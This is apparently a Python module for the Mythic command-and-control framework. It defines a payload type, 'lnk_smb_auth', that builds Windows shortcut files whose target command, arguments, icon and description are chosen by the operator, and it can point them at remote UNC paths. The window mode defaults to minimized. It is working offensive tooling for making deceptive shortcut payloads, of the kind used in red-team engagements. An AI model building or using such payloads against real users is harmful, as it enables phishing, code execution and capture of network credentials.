import logging
import pathlib
import traceback
from mythic_container.PayloadBuilder import *
from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import json
import os
import shutil
import base64
import random

from clickable.agent_functions import pylnk3_modified as pylnk3
import mslex

def for_file(
    target_file, lnk_name=None, arguments=None, description=None, icon_file=None, icon_index=0,
    work_dir=None, window_mode=None,
):
    lnk = pylnk3.create(lnk_name)
    lnk.link_flags.IsUnicode = True
    lnk.link_info = None
    if target_file.startswith('\\\\'):
        # remote link
        lnk.link_info = pylnk3.LinkInfo()
        lnk.link_info.remote = 1
        # extract server + share name from full path
        path_parts = target_file.split('\\')
        share_name, base_name = '\\'.join(path_parts[:4]), '\\'.join(path_parts[4:])
        lnk.link_info.network_share_name = share_name.upper()
        lnk.link_info.base_name = base_name
        # somehow it requires EnvironmentVariableDataBlock & HasExpString flag
        env_data_block = pylnk3.ExtraData_EnvironmentVariableDataBlock()
        env_data_block.target_ansi = target_file
        env_data_block.target_unicode = target_file
        lnk.extra_data = pylnk3.ExtraData(blocks=[env_data_block])
        lnk.link_flags.HasExpString = True
    else:
        # local link
        levels = list(pylnk3.path_levels(target_file))
        elements = [pylnk3.RootEntry(pylnk3.ROOT_MY_COMPUTER),
                    pylnk3.DriveEntry(levels[0])]
        for i, level in enumerate(levels[1:]):
            last = (i == len(levels[1:]) - 1)
            if last:
                segment = pylnk3.PathSegmentEntry.create_for_path(level, entry_type=pylnk3.TYPE_FILE)
            else:
                segment = pylnk3.PathSegmentEntry.create_for_path(level, entry_type=pylnk3.TYPE_FOLDER)
            elements.append(segment)
        lnk.shell_item_id_list = pylnk3.LinkTargetIDList()
        lnk.shell_item_id_list.items = elements
    # lnk.link_flags.HasLinkInfo = True
    if arguments:
        lnk.link_flags.HasArguments = True
        lnk.arguments = arguments
    if description:
        lnk.link_flags.HasName = True
        lnk.description = description
    if icon_file:
        lnk.link_flags.HasIconLocation = True
        lnk.icon = icon_file
    lnk.icon_index = icon_index
    if work_dir:
        lnk.link_flags.HasWorkingDir = True
        lnk.work_dir = work_dir
    if window_mode:
        lnk.window_mode = window_mode
    if lnk_name:
        lnk.save()
    return lnk

class lnk_smb_auth(PayloadType):
    name = "lnk_smb_auth"
    file_extension = "lnk"
    author = "@hegusung"
    supported_os = [SupportedOS.Windows]
    wrapper = False
    wrapped_payloads = []
    note = """Creates a LNK file which executes a command"""
    supports_dynamic_loading = True
    c2_profiles = []
    mythic_encrypts = True 
    translation_container = None # "myPythonTranslation"
    agent_path = pathlib.Path(".") / "clickable"
    agent_icon_path = agent_path / "agent_functions" / "click.svg"
    agent_code_path = agent_path / "agent_code"
    build_parameters = [
        BuildParameter(
            name = "binary",
            parameter_type=BuildParameterType.String,
            default_value="",
            description="Defines the binary value of the lnk",
        ),
        BuildParameter(
            name = "args",
            parameter_type=BuildParameterType.String,
            default_value="",
            description="Defines the argument value of the lnk",
        ),
        BuildParameter(
            name = "description",
            parameter_type=BuildParameterType.String,
            default_value=None,
            description="Defines the description value in the lnk file",
        ),
        BuildParameter(
            name = "icon_file",
            parameter_type=BuildParameterType.String,
            default_value=None,
            description="Defines the icon in the lnk file",
        ),
        BuildParameter(
            name = "work_dir",
            parameter_type=BuildParameterType.String,
            default_value=None,
            description="Defines the working directory in the lnk file",
        ),
        BuildParameter(
            name = "window_mode",
            parameter_type=BuildParameterType.ChooseOne,
            choices=['Maximized', 'Normal', 'Minimized'],
            default_value='Minimized',
            description="Defines the Window mode when the lnk file is opened",
        ),
    ]

    build_steps = [
    ]

    async def build(self) -> BuildResponse:
        # this function gets called to create an instance of your payload
        resp = BuildResponse(status=BuildStatus.Success)
        # create the payload
        build_msg = ""

        try:
            binary = self.get_parameter('binary')
            args = self.get_parameter('args')

            for_file(
                binary,
                "/tmp/a.lnk",
                arguments=args,
                description=self.get_parameter('description'),
                icon_file=self.get_parameter('icon_file'),
                work_dir=self.get_parameter('work_dir'),
                window_mode=self.get_parameter('window_mode')
            ) 

            f = open("/tmp/a.lnk", "rb")
            lnk_data = f.read()
            f.close()

            try:
                os.remove("/tmp/a.lnk")
            except:
                pass
        
            resp.payload = lnk_data
            resp.build_message = "Successfully built!\n"

        except Exception as e:
            traceback.print_exc()

            resp.set_status(BuildStatus.Error)
            resp.build_stderr = "Error building payload: " + str(e)
        return resp
